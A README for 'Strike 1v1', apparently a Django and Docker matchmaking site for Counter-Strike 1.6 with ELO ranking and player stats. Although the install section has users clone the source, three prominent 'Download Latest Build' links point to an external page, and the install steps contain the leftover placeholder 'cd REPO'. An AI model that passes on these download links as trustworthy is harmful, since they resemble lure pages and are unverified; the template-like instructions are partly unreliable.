# Strike 1v1 - Matchmaking Platform 2026

> **A Django-powered web matchmaking platform for Counter-Strike 1.6 players, designed to run organized 1v1 competition with ELO-based ranking and rich player stats.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leo-west/strike-1v1-django-hub?style=flat-square)](https://github.com/leo-west/strike-1v1-django-hub)

---

<p align="center">
  <a href="https://leo-west.github.io/strike-1v1-django-hub/">
    <img src="https://img.shields.io/badge/Download-Strike%201v1%20Latest-brightgreen?style=for-the-badge" alt="Download Strike 1v1">
  </a>
</p>

> **[Download Latest Build - Strike 1v1 v1.0](https://leo-west.github.io/strike-1v1-django-hub/)**

---

[Download Latest Build](https://leo-west.github.io/strike-1v1-django-hub/)

---

## Overview

Strike 1v1 is built for Counter-Strike 1.6 players who want a clean, competitive 1v1 matchmaking flow instead of ad hoc challenges. Powered by Django, it manages player pairing, records performance data, and uses an ELO ranking model to keep matches aligned with skill levels. It fits both casual users looking for a quick duel and more serious players who want to watch their ranking evolve.

The interface leans into a retro CS 1.6 look while still offering modern web-based matchmaking features. Deployment is container-friendly through Docker, which makes setup and expansion straightforward for administrators. On the player side, the platform exposes match history, win rate, K/D ratio, and other useful stats, while opponent selection happens automatically based on rating.

---

## Core Features

- **Automated Matchmaking** - Pairs players by ELO rating and current availability
- **Player Statistics Dashboard** - Shows ELO growth, kill/death ratios, win rates, and match records
- **Containerized Deployment** - Docker-ready setup for simpler installation and scaling
- **Retro User Interface** - Visual style inspired by the Counter-Strike 1.6 era
- **Competitive Ranking System** - ELO values update dynamically after each match
- **Match History** - Full log of matches with detailed results
- **Player Profiles** - Individual pages with performance metrics and trend data

---

## Installation

```bash
# Clone the repository
git clone https://github.com/leo-west/strike-1v1-django-hub.git

# Navigate to the project directory
cd REPO

# Build and run with Docker
docker-compose up -d
```

For manual installation without Docker, ensure Python 3.8+ and Django are installed, then run:

```bash
pip install -r requirements.txt
python manage.py migrate
python manage.py runserver
```

---

## Usage

1. **Launch the app** with Docker or the Django development server
2. **Register players** through the web interface
3. **Start matchmaking** - the platform automatically selects a suitable opponent
4. **Submit match results** after each 1v1 game
5. **Check statistics** on the player dashboard to follow progress

Example workflow:
- Open the platform at `http://localhost:8000`
- Create player accounts or use default admin credentials
- Click "Find Match" to start the matchmaking process
- Enter match scores after completion to update rankings

---

## Configuration

Django settings control the application behavior. Important options include:

- `MATCHMAKING_TIMEOUT` - Time window for finding opponents (default: 300 seconds)
- `ELO_K_FACTOR` - Sensitivity of ELO adjustments (default: 32)
- `MATCH_HISTORY_LIMIT` - Number of displayed past matches per player

Configuration files are located in the `strike1v1/settings/` directory. Environment variables can override default values for production deployments.

---

## Requirements

- **Platform**: Web browser (modern Chrome, Firefox, or Edge)
- **Server**: Python 3.8+, Django 4.x, PostgreSQL or SQLite
- **Deployment**: Docker (recommended) or manual Python environment
- **Storage**: Minimal - player data and match history stored in database
- **Network**: Standard web server connectivity for multiplayer access

---

## FAQ

**How does matchmaking work?**  
Players are matched with others who have similar ELO ratings and are currently available. The system favors balanced skill levels over faster queue times.

**Can I reset player statistics?**  
Yes. Administrators can clear data for a single player or perform a complete reset from the admin panel.

**Is there support for team matches?**  
No. Strike 1v1 is focused solely on 1v1 matchmaking for Counter-Strike 1.6.

**How often are updates released?**  
Releases follow semantic versioning. Visit the releases page for the newest changes and bug fixes.

**Can I customize the ELO system?**  
Yes. The K-factor and starting ELO values can be changed in the settings file.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
